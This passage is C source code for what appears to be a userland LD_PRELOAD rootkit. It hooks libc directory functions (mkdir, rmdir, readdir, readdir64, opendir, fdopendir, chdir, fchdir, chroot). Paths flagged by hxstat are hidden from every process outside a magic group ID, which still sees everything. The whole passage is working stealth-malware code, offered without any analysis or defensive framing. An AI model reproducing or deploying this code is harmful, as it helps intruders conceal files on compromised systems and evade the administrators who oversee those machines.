int mkdir(const char *pathname, mode_t mode)
{
    HOOK(o_mkdir,"mkdir");
    if(getgid()==MGID) return o_mkdir(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_mkdir(pathname,mode);
}
int rmdir(const char *pathname)
{
    HOOK(o_rmdir,"rmdir");
    if(getgid()==MGID) return o_rmdir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_rmdir(pathname);
}
struct dirent *readdir(DIR *dirp)
{
    HOOK(o_readdir, "readdir");
    struct dirent *dir;
    char path[4097];
    do{
        dir = o_readdir(dirp);
        if(getgid()==MGID) return dir;
        if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path)));
    return dir;
}
struct dirent64 *readdir64(DIR *dirp)
{
    HOOK(o_readdir64, "readdir64");
    struct dirent64 *dir;
    char path[4097];
    do {
        dir = o_readdir64(dirp);
        if(getgid()==MGID) return dir;
        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path)));
    return dir;
}
DIR *opendir(const char *pathname)
{
    HOOK(o_opendir,"opendir");
    if(getgid()==MGID) return o_opendir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_opendir(pathname);
}
DIR *opendir64(const char *pathname)
{
    HOOK(o_opendir64,"opendir64");
    if(getgid()==MGID) return o_opendir64(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_opendir64(pathname);
}
DIR *fdopendir(int fd)
{
    HOOK(o_fdopendir,"fdopendir");
    if(getgid()==MGID) return o_fdopendir(fd);
    if(hfxstat(fd)) { errno = ENOENT; return NULL; }
    return o_fdopendir(fd);
}
int chdir(const char *pathname)
{
    HOOK(o_chdir,"chdir");
    if(getgid()==MGID) return o_chdir(pathname);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chdir(pathname);
}
int fchdir(int fd)
{
    HOOK(o_fchdir,"fchdir");
    if(getgid()==MGID) return o_fchdir(fd);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fchdir(fd);
}
int chroot(const char *path)
{
    HOOK(o_chroot,"chroot");
    if(getgid()==MGID) return o_chroot(path);
    if(hxstat(path)){ errno=ENOENT; return -1; }
    return o_chroot(path);
}
